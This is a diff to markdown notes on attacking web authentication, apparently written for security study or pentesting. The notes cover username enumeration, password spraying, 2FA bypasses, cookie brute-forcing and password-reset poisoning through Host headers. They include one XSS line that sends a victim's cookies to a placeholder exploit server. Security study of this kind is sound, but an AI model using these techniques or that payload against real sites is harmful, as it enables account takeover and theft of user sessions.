@@ -2,12 +2,16 @@
 - try to register a new user with the username that is already taken
 - check response codes in user login
 - error messages in user login:
-  - response length: even by 1 character (when ther's a typo err)
+  - response length: even by 1 character (when there's a typo err)
 - check response time: send as long password as possible and if the username is correct the response time may be longer than usual
 - via account lock:
   - Sometimes an application may respond invalid username or password but in case we hit the username that exists more than let's say 3 times the response will be different. E.g.: You have made too many incorrect login attempts
 
 ### Brute-forcing usernames
+- Can you access private user profiles without loggin in as those users?
+- Profile name may sometimes be the same as the login username
+- Check HTTP responses to see if any email addresses are disclosed in http responses
+
 Usernames are especially easy to guess if they conform to a recognizable pattern, such as an email address. For example, it is very common to see business logins in the format firstname.lastname@somecompany.com. However, even if there is no obvious pattern, sometimes even high-privileged accounts are created using predictable usernames, such as admin or administrator.
 
 During auditing, check whether the website discloses potential usernames publicly. For example, are you able to access user profiles without logging in? Even if the actual content of the profiles is hidden, the name used in the profile is sometimes the same as the login username. You should also check HTTP responses to see if any email addresses are disclosed. Occasionally, responses contain email addresses of high-privileged users, such as administrators or IT support. 
@@ -17,8 +21,18 @@ During auditing, check whether the website discloses potential usernames publicl
 
 - The counter for the number of failed attempts resets if the IP owner logs in successfully to his own account
   - for example, you might sometimes find that your IP is blocked if you fail to log in too many times. In some implementations, the counter for the number of failed attempts resets if the IP owner logs in successfully. This means an attacker would simply have to log in to their own account every few attempts to prevent this limit from ever being reached.
+- Block account without blocking the IP:
+  - pick for example 3 most popular passwords and use them to login to hundreds of accounts
+- Multiple passwords per request:
+  - `{ "password": "some passs" }` to an array:
+`{ "password": ["some passs", "another pass"] }`
 
 ### Bypassing two-factor authentication
+> Note may be useful to check TTL of mfa-codes
+- websites don't check the second verification step of MFA and you can visit "logged-in only" pages after the correct username and password
+- After a user has completed the initial login step, the website doesn't adequately verify that the same user is completing the second step. 
+- 2FA bypass using a brute-force attack
+
 - If the user is first prompted to enter a password, and then prompted to enter a verification code on a separate page, the user is effectively in a "logged in" state before they have entered the verification code. In this case, it is worth testing to see if you can directly skip to "logged-in only" pages after completing the first authentication step. Occasionally, you will find that a website doesn't actually check whether or not you completed the second step before loading the page. 
 - After a user has completed the initial login step, the website doesn't adequately verify that the same user is completing the second step:  
 
@@ -75,7 +89,7 @@ Some websites generate this cookie based on a predictable concatenation of stati
 - try to figure out how it is generated and whether it can be brute forced
 - if successful go to another url with that cookie e.g. /account
 
-### If not possible to crate your own account try to steal existing user cookies
+### If not possible to create your own account try to steal existing user cookies
 ```
 <script>document.location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
 ```
@@ -96,6 +110,8 @@ Submit a password reset request on the behalf of user that we're trying to attac
 Later the victim will receive the pass reset link to their email and if victim clicks on it (or it is fetched in some other way, for example, by an antivirus scanner) - you'll see their real reset token in the server logs
 
 If `Host` header does not change the generated url you can try to add additional header `X-Forwarded-Host` which may change the resulting url
+
+> Note: Try changing the `Host` or adding `X-Forwarded-Host` header which will change the url that victim will receive to their email. Then wait for the victim to click on that link
 
 > Note: neither `Host` nor `X-Forwarded-Host` should contain "https://"
 
